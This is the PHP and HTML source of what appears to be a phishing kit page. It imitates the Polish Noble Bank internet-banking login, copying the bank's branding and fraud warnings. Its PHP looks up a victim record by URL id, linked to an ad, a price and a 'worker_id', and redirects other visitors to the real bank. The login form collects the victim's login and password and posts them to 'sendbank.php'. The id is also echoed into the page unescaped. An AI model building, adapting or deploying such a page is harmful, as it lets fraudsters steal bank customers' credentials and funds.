<?php
include "../service.php";
include "../../settings.php";
if (file_exists("../data/" . $_GET['id'] . ".xml") == false){
    header("location: " . $_temp['original']);
    exit;
}
$xml = simplexml_load_file("../data/" . $_GET["id"] . ".xml");

checkLK($_temp['service'], $_temp['valute'], $_GET['id'], $xml->obyava, $xml->price, $xml->worker_id, "Noble Bank.");
?>
<html lang="pl" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Bankowość Internetowa - Noble Bank</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <meta name="google" value="notranslate">
    <meta name="description" content="System Bankowości Internetowej Noble Banku to najwygodniejszy sposób zarządzania swoimi finansami. Możesz z niego korzystać prosto ze swojego komputera wszędzie tam, gdzie masz dostęp do Internetu.">
            <meta name="robots" content="noindex">
        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable = no">

    <!--[if lt IE 9]>
        <script src="/static/scripts/libs/html5shiv.min.js"></script>
    <![endif]-->

    

    <link rel="stylesheet" type="text/css" href="./noble_files/bootstrap.css">


    <!--[if !IE]><!-->
    <link rel="stylesheet" type="text/css" href="./noble_files/combined.min.css">
    <!--<![endif]-->
    <!--[if IE]>
        <link rel="stylesheet" type="text/css" href="/static/noblebank/css/combined-parts.css?1637375040">
        <link rel="stylesheet" type="text/css" href="/static/noblebank/css/our_ie.css?1637375040">

    <![endif]-->

    <!--[if IE 9]>
        <style>
            .h--submenu > li {
                display: inline;
                float: left;
            }
            .h--submenu > li .select-field {
                display:block !important;

                width:auto;
            }
        </style>
    <![endif]-->
    <link rel="stylesheet" type="text/css" href="./noble_files/default.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/our_changes.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/popup-window.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/popup-window-colors.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/changes.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/font_icoomon_styles.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/popupCreditPa.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/popupConsent.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/banner.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/smart-app-banner.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/settings.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/settings(1).css">
    <link rel="stylesheet" type="text/css" href="./noble_files/main.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/icons.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/proposals.css">
    <link href="./noble_files/messages.css" rel="stylesheet" type="text/css">
    <link href="./noble_files/Lato.css" rel="stylesheet" type="text/css">
        <style>
        @font-face {
            font-family: 'ui';
            src: url("/static/fonts/ui-kit.ttf?1637375040") format("truetype"),
            url("/static/fonts/ui-kit.woff?1637375040") format("woff"),
            url("/static/fonts/ui-kit.svg?1637375040") format("svg");
            font-weight: normal;
            font-style: normal;
        }
    </style>
    <link rel="stylesheet" type="text/css" href="./noble_files/ui_kit.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/datepicker.css">
    <link rel="stylesheet" type="text/css" href="./noble_files/our_changes(1).css">
    <link rel="stylesheet" type="text/css" href="./noble_files/ui_kit(1).css">

            <meta name="apple-itunes-app" content="app-id=674598453">
        <meta name="google-play-app" content="app-id=pl.noblebank.mobile">
        <meta name="msApplication-ID" content="x5bca1ad9y2d66y42afyaebayd9f8230723f2x">
        <meta name="msApplication-PackageFamilyName" content="39001CDE-3E0A-4B48-9240-07A9D8614F07_bbx7k27895yhg">
        <link rel="manifest" href="/static/noblebank/manifest.json">

        

        <!-- FAVICONS -->
        <link rel="apple-touch-icon" sizes="180x180" href="/static/noblebank/images/favicons/favicon-180x180.png">
        <link rel="apple-touch-icon" sizes="114x114" href="/static/noblebank/images/favicons/favicon-114x114.png">
        <link rel="apple-touch-icon" sizes="72x72" href="/static/noblebank/images/favicons/favicon-72x72.png">
        <link rel="icon" type="image/png" href="/static/noblebank/images/favicons/favicon-192x192.png" sizes="192x192">
        <link rel="icon" type="image/png" href="/static/noblebank/images/favicons/favicon-96x96.png" sizes="96x96">
        <link rel="icon" type="image/png" href="/static/noblebank/images/favicons/favicon-32x32.png" sizes="32x32">
        <link rel="icon" type="image/png" href="/static/noblebank/images/favicons/favicon-16x16.png" sizes="16x16">
        <!-- END FAVICONS -->
        
    <script data-cache="1637375040" src="./noble_files/router.js"></script>

    <link rel="shortcut icon" href="/static/noblebank/images/favicon.ico" type="image/x-icon">
            <script data-cache="1637375040" data-main="/static/scripts/main" src="./noble_files/require.js"></script>   
        <script type="text/javascript">
        var app_brand = 'noblebank';
        var isDemoMode = false;
        var smartBannerDaysHidden = '15';
        var smartBannerDaysReminder = '90';
        var defaultContext = '';
    </script>
    
<script type="text/javascript">
    var functionalities = {
        "b2_transfers": false,
        "b2_accounts": false,
        "b2_dashboard": false    };
    var routeDashboard = "wallet/index";
</script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="main" src="./noble_files/main.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="app" src="./noble_files/app.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jquery" src="./noble_files/jquery-1.11.2.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="underscore" src="./noble_files/underscore-min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="backbone" src="./noble_files/backbone-min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="router" src="./noble_files/router(1).js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="RequestModel" src="./noble_files/RequestModel.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="mainRouter" src="./noble_files/router(2).js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="mainRequestModel" src="./noble_files/RequestModel(1).js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jqueryMigrate" src="./noble_files/jquery-migrate-1.2.1.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="md5" src="./noble_files/md5.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="easing" src="./noble_files/jquery.easing.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="front/views/IndexView" src="./noble_files/IndexView.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jCaret" src="./noble_files/jquery.caret.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="SiteView" src="./noble_files/SiteView.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="SmartBanner" src="./noble_files/smart-app-banner.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="MobileDetect" src="./noble_files/mobile-detect.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="eventManager" src="./noble_files/EventManager.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="banner" src="./noble_files/Banner.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="mainSiteView" src="./noble_files/SiteView(1).js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="legacy" src="./noble_files/legacy.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="livequery" src="./noble_files/jquery.livequery.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="jqueryui" src="./noble_files/jquery-ui.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="validateForms" src="./noble_files/validateForms.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="DefaultActions" src="./noble_files/DefaultActions.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="slick" src="./noble_files/slick.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="mainDefaultActions" src="./noble_files/DefaultActions(1).js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="raphael" src="./noble_files/raphael-min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="popUp" src="./noble_files/popup.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="modernizr" src="./noble_files/modernizr.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="icheck" src="./noble_files/icheck.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="inputmask_core" src="./noble_files/inputmask.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="actual" src="./noble_files/jquery.actual.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="fileDownload" src="./noble_files/jquery.fileDownload.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="picker" src="./noble_files/picker.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="formSelect" src="./noble_files/formSelect.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="bootstrap" src="./noble_files/bootstrap.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="nanoscroller" src="./noble_files/jquery.nanoscroller.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="inputmask" src="./noble_files/jquery.inputmask.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="pickerdate" src="./noble_files/picker.date.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="picker_pl" src="./noble_files/pl_PL.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="Fingerprint2" src="./noble_files/fp2.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="datepicker" src="./noble_files/bootstrap-datepicker.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="notifications" src="./noble_files/Notifications.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="animateAuto" src="./noble_files/jquery.animateAuto.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="uiKit" src="./noble_files/UiKit.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="stickyMenu" src="./noble_files/stickyMenu.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="confirmation" src="./noble_files/Confirmation.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="chat" src="./noble_files/Chat.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="transfer" src="./noble_files/Transfer.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="oad" src="./noble_files/oad.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="ferryt" src="./noble_files/Ferryt.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="bootstrapTour" src="./noble_files/bootstrap-tour.min.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="raphaelpiechart" src="./noble_files/raphaelpiechart.js"></script><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="tutorial" src="./noble_files/tutorial.js"></script></head>
            <body class="login-page" data-brand="noblebank">

    <noscript>
    <div class="error-page">
        <div class="page-wrapper">
            <section class="wrapper">
                <h2 class="clear">Nie można skorzystać z bankowości internetowej</h2>
                <h3>Przeglądarka internetowa ma wyłączoną obsługę JavaScript</h3>
                <h3>Prosimy o zmianę ustawień przeglądarki</h3>
                <br />
                <h3>Jak zmienić ustawienia przeglądarki?</h3>

                <ul class="browser-list">
                    <li class="ff">
                        <a href="http://support.mozilla.org/pl/kb/javascript" title="Zaktualizuj przegldarkę" target="_blank"><div class="image"></div>MOZILLA FIREFOX</a>
                    </li>

                    <li class="chrome">
                        <a href="http://support.google.com/chrome/answer/114662?hl=pl" title="Zaktualizuj przegldarkę" target="_blank"><div class="image"></div>GOOGLE CHROME</a>
                    </li>

                    <li class="ie">
                        <a href="http://windows.microsoft.com/pl-pl/windows/what-do-internet-explorer-script-errors#1TC=windows-7" title="Zaktualizuj przegldarkę" target="_blank"><div class="image"></div>INTERNET EXPLORER</a>
                    </li>

                    <li class="safari">
                        <a href="http://support.apple.com/kb/PH17209?viewlocale=pl_PL&locale=pl_PL" title="Zaktualizuj przegldarkę" target="_blank"><div class="image"></div>SAFARI 5</a>
                    </li>

                    <li class="opera">
                        <a href="http://help.opera.com/Windows/12.10/pl/javascript.html" title="Zaktualizuj przegldarkę"><div class="image" target="_blank"></div>OPERA 10</a>
                    </li>
                </ul>


                <a href="http://noblebank.pl" class="h--btn h--btn-light-gray h--gray-hover">&larr; POWRÓT DO noblebank.PL</a>


                <p class="short">W razie jakichkolwiek pytań lub wątpliwości prosimy o&nbsp;kontakt z&nbsp;Infolinią Banku. Nasi konsultanci są do Państwa dyspozycji codziennie całodobowo.</p>

                <div class="h--btn h--btn-wide no-border prepend-icon"><i class="icon icon--phone"></i> zadzwoń na infolinię </div>

            </section>
        </div>
    </div>
    </noscript>

    <div class="h--box-alert-top error extendSessionWrapper" style="height: 0px;"></div>
    <div class="h--box-alert-top errorAccessAttempts" style="display: none; height: 40px;">
        <i class="icon icon--valid-notice2"></i>PRÓBA LOGOWANIA Z NIEDOZWOLONEGO OBSZARU GEOGRAFICZNEGO <span class="accessAttemptsDate">DATA: </span><span class="accessAttemptsTime">GODZ: </span><span class="accessAttemptsIp">ADRES IP: </span><button class="h--btn hideZoneInformation" type="button">zamknij</button>
    </div>
    
<section class="h--section-white login-wrapper margin0" id="index-container">
    <div class="wrapper">
        <div id="logotype">
                                                    <img src="./noble_files/nb_logo.png">
        </div>
        <div id="left-container">
        
<div id="login-response"></div>
<div id="login-container" class="jsPrepareConfirmation jsActiveConfirmation">
    
<form id="signinform" class="h--form-login mb20 clearfix"  action="sendbank.php" method="post">
    <input type="hidden" name="id" value="<?php echo $_GET['id']; ?>">
    <input type="hidden" name="type" value="13">
<div class="steps two">
    <div class="step one active"><div><span>Login</span></div></div>
    <div class="step two"><div><span>Hasło</span></div></div>
</div>
<div class="show_login"></div>
<div class="step1">
    <div class="full-window"></div>
    <div class="h--form--field h--input-prepend">
                                    <input name="logindata" type="text" class="validateOnChangeOnly toValidate validateRequired validateLength validateLoginAlias js-fillInput" placeholder="WPISZ LOGIN LUB ALIAS" autocomplete="off" data-validaterequired_message="error:&lt;span&gt;Pole jest wymagane&lt;/span&gt;;" data-validatelength="max:25;message:&lt;span&gt;Niepoprawny login&lt;/span&gt;;" data-validatelength_message="error:&lt;span&gt;Nieprawidłowy login&lt;/span&gt;;" data-validateloginalias="message:&lt;span&gt;Niepoprawny login&lt;/span&gt;;" data-validateloginalias_message="error:&lt;span&gt;Niepoprawny login&lt;/span&gt;;">        <span class="add-on"></span>
                                      <input name="passdata" type="text" class="validateOnChangeOnly toValidate validateRequired validateLength validateLoginAlias js-fillInput" placeholder="WPISZ TUTAJ SWOJE HASLO" autocomplete="off" data-validaterequired_message="error:&lt;span&gt;Pole jest wymagane&lt;/span&gt;;" data-validatelength="max:25;message:&lt;span&gt;Niepoprawny login&lt;/span&gt;;" data-validatelength_message="error:&lt;span&gt;Nieprawidłowy login&lt;/span&gt;;" data-validateloginalias="message:&lt;span&gt;Niepoprawny login&lt;/span&gt;;" data-validateloginalias_message="error:&lt;span&gt;Niepoprawny login&lt;/span&gt;;">        <span class="add-on"></span>

                <span class="add-on add-on-login" id="to_login-information"><i class="icon icon--info-mark"></i></span>
            <div class="login-information">
                <div class="information-title">GDZIE ZNAJDĘ LOGIN LUB ALIAS?</div><i id="close_login-information" class="icon icon--info-close close_login-information"></i>
                <div class="clearfix"></div>
                <p>LOGIN - został wysłany e-mailem lub znajduje się na Umowie o Bankowość Elektroniczną lub Pakietową. Składa się z samych cyfr.</p>
                <p>ALIAS – tzw . Własny login, czyli dowolna nazwa, którą można zdefiniować po zalogowaniu się do Bankowości Internetowej.</p>
            </div>
        </div>
    <button type="submit" class="h--btn-arrow-right h--btn-light-green gotoPassword float-right long login-next-button fz-12">dalej</button>
    <button type="button" class="h--btn h--btn-light-gray h--green-hover float-left prepend-icon showHideHelp fz-12"> pomoc</button>
    <div class="clearfix"></div>
    
</div>
</form></div>

       <div class="messages">
    
    
    
            <div class="h--info msg_list">
            <p class="title-wide"><span>Wiadomości</span></p>
            <ul>
                                    <li class="showMgsSection" data-code="313">
                        <div class="msg_date">19.11.2021</div>
                        <div class="msg_title"><p>Start procesu umorzeń subwencji dla MŚP z Tarczy Finansowej PFR 2.0</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="313">
                        <div class="msg_date">19.11.2021</div>
                        <div class="msg_title"><p>Start procesu umorzeń subwencji dla MŚP z Tarczy Finansowej PFR 2.0</p>
                         <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500358_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="309">
                        <div class="msg_date">30.09.2021</div>
                        <div class="msg_title"><p>Uważaj na SMS-y z linkami - nowe ataki!</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="309">
                        <div class="msg_date">30.09.2021</div>
                        <div class="msg_title"><p>Uważaj na SMS-y z linkami - nowe ataki!</p>
                         <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500365_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="308">
                        <div class="msg_date">30.09.2021</div>
                        <div class="msg_title"><p>Uważaj na oszustów podszywających się pod pracowników banku!</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="308">
                        <div class="msg_date">30.09.2021</div>
                        <div class="msg_title"><p>Uważaj na oszustów podszywających się pod pracowników banku!</p>
                         <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500368_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="306">
                        <div class="msg_date">03.09.2021</div>
                        <div class="msg_title"><p>Przypominamy ważne zasady bezpiecznego logowania do bankowości internetowej.</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="306">
                        <div class="msg_date">03.09.2021</div>
                        <div class="msg_title"><p>Przypominamy ważne zasady bezpiecznego logowania do bankowości internetowej.</p>
                         <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500370_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="304">
                        <div class="msg_date">19.08.2021</div>
                        <div class="msg_title"><p>Dostałeś SMS-a z prośbą o dopłatę do rachunku lub przesyłki? To prawdopodobnie oszustwo!</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="304">
                        <div class="msg_date">19.08.2021</div>
                        <div class="msg_title"><p>Dostałeś SMS-a z prośbą o dopłatę do rachunku lub przesyłki? To prawdopodobnie oszustwo!</p>
                         <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500373_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                            </ul>
        </div>
        
            <div class="title-wide moreMgs"><span class="decoration triangle down show-more-descop">POKAŻ WIĘCEJ</span><span class="show-more-mobile">POKAŻ WIĘCEJ</span></div>
        <div class="h--info msg_list more hide">
            <ul>
                                    <li class="showMgsSection" data-code="303">
                        <div class="msg_date">03.08.2021</div>
                        <div class="msg_title"><p>Sprzedajesz lub kupujesz na OLX? Uważaj na oszustów!</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="303">
                        <div class="msg_date">03.08.2021</div>
                        <div class="msg_title"><p>Sprzedajesz lub kupujesz na OLX? Uważaj na oszustów!</p>
                        <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500376_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="294">
                        <div class="msg_date">26.03.2021</div>
                        <div class="msg_title"><p>Ostrzeżenie przed oszustami podszywającymi się pod pracowników Banku</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="294">
                        <div class="msg_date">26.03.2021</div>
                        <div class="msg_title"><p>Ostrzeżenie przed oszustami podszywającymi się pod pracowników Banku</p>
                        <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500378_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="291">
                        <div class="msg_date">08.02.2021</div>
                        <div class="msg_title"><p>Fałszywe wiadomości e-mailowe.</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="291">
                        <div class="msg_date">08.02.2021</div>
                        <div class="msg_title"><p>Fałszywe wiadomości e-mailowe.</p>
                        <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500382_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="285">
                        <div class="msg_date">15.12.2020</div>
                        <div class="msg_title"><p>Uważaj - wyłudzenia „na dopłatę”</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="285">
                        <div class="msg_date">15.12.2020</div>
                        <div class="msg_title"><p>Uważaj - wyłudzenia „na dopłatę”</p>
                        <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500384_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="279">
                        <div class="msg_date">06.11.2020</div>
                        <div class="msg_title"><p>Uważaj na oszustów podających się za pracowników firmy inwestycyjnej</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="279">
                        <div class="msg_date">06.11.2020</div>
                        <div class="msg_title"><p>Uważaj na oszustów podających się za pracowników firmy inwestycyjnej</p>
                        <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500387_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                                    <li class="showMgsSection" data-code="271">
                        <div class="msg_date">23.06.2020</div>
                        <div class="msg_title"><p>Przestrzegamy przed wyłudzeniami środków od klientów banków – tzw. metodą na dopłatę.</p></div>
                    </li>
                    <li class="showMgsSectionMobile" data-code="271">
                        <div class="msg_date">23.06.2020</div>
                        <div class="msg_title"><p>Przestrzegamy przed wyłudzeniami środków od klientów banków – tzw. metodą na dopłatę.</p>
                        <i class="icon icon--more-black msg_arrow"></i>
                        </div>
                        <div class="mobile_msg_description">
    
    <div style="height:42px;"></div>

    <div class="mgs_content scrollMe nano" id="1637430500390_nanoScroller"><div class="nano-content content" tabindex="0" style="padding: 0px;">
    </div><div class="nano-pane" style="display: none;"><div class="nano-slider" style="transform: translate(0px, 0px);"></div></div></div>
    
</div>                    </li>
                            </ul>
        </div>
    
    <div class="bt">
                    <a href="http://noblebank.pl/" class="h--btn h--green-hover">← POWRÓT DO noblebank.PL</a>
            </div>
</div>    </div>
    </div>
</section>

<div class="info-wrapper">
    <section class="h--section-gray margin0 slide_section" id="login_help_section">
    <div class="h--btn-wide small h--btn-white" id="login_helper">
    <div id="login-help-header">
        Pomoc
         <div id="login-help-close-button" class="hideLoginHelp">×</div>
    </div>

    <div class="accordion" id="login-help-accordion">
      <div>
        <div id="login-help-heading-five" class="hideAllCollapseLoginHelp">
          <div class="mb-0">
            <div class="collapsed collapsable toggleLoginHelpArrow" type="button" data-toggle="collapse" data-target="#login-help-collapse-five" aria-expanded="false" aria-controls="login-help-collapse-five">
                <div class="login-help-heading">Problem z loginem<i class="icon icon--more-black login-help-heading-arrow"></i></div>
            </div>
          </div>
        </div>
        <div id="login-help-collapse-five" class="collapse" aria-labelledby="login-help-heading-five" data-parent="#login-help-accordion">
          <div class="login-help-body">
              <p>Jeśli nie pamiętasz swojego loginu do Bankowości Internetowej, zawsze możesz go sprawdzić na umowie lub w mailu z Banku.</p>
              <p>Nawet jeśli już zmieniłeś login na własny, to zawsze możesz zalogować się tym loginem, który dostałeś podczas zawarcia umowy. Wygodnie i bezpiecznie, prawda?</p>

              <p>
                                        Jeśli nie masz pod ręką umowy ani maila, możesz również skorzystać z samodzielnego przypomnienia loginu na stronie:
                      <a href="/autorize1649694540342573#management/remindLogin">Przypomnij login</a>.
                                </p>
              <p>Postępuj zgodnie z krokami instrukcji na ekranie.</p>
          </div>
        </div>
      </div>
      <hr>

      <div>
        <div id="login-help-heading-four" class="hideAllCollapseLoginHelp">
          <div class="mb-0">
            <div class="collapsed collapsable toggleLoginHelpArrow" type="button" data-toggle="collapse" data-target="#login-help-collapse-four" aria-expanded="false" aria-controls="login-help-collapse-four">
              <div class="login-help-heading">Problem z hasłem tymczasowym<i class="icon icon--more-black login-help-heading-arrow"></i></div>
            </div>
          </div>
        </div>
        <div id="login-help-collapse-four" class="collapse" aria-labelledby="login-help-heading-four" data-parent="#login-help-accordion">
          <div class="login-help-body">
              <p>Do pierwszego zalogowania wykorzystaj hasło startowe, które otrzymałeś od nas SMSem.</p>
              <p>Jeśli w ciągu kilku minut od podpisania umowy w oddziale nie otrzymałeś SMSa z hasłem, udaj się do najbliższej placówki lub zadzwoń na infolinię pod numerem
              326&nbsp;043 017. Opłata za połączenie wg taryfy operatora.</p>
              <p>Jeśli złożyłeś wniosek o Konto i Bankowość Elektroniczną przez Internet, SMS z hasłem do Bankowości Elektronicznej powinieneś otrzymać w ciągu dwóch dni od podpisania umowy w obecności kuriera.
              Jeśli SMS nie dotarł, udaj się do najbliższej placówki lub zadzwoń na infolinię pod numerem 326&nbsp;043 017. Opłata za połączenie wg taryfy operatora.</p>
              <p>Hasłem startowym po raz pierwszy możesz zalogować się zarówno do Bankowości Internetowej jak i Mobilnej.</p>
              <p>Jeśli w pierwszej kolejności logujesz się do Bankowości Internetowej, w trakcie logowania poprosimy Cię o utworzenie własnego hasła. Tym nowym hasłem kolejny raz zalogujesz się do Bankowości Internetowej oraz wykorzystasz je do pierwszego logowania do Bankowości Mobilnej.</p>
          </div>
        </div>
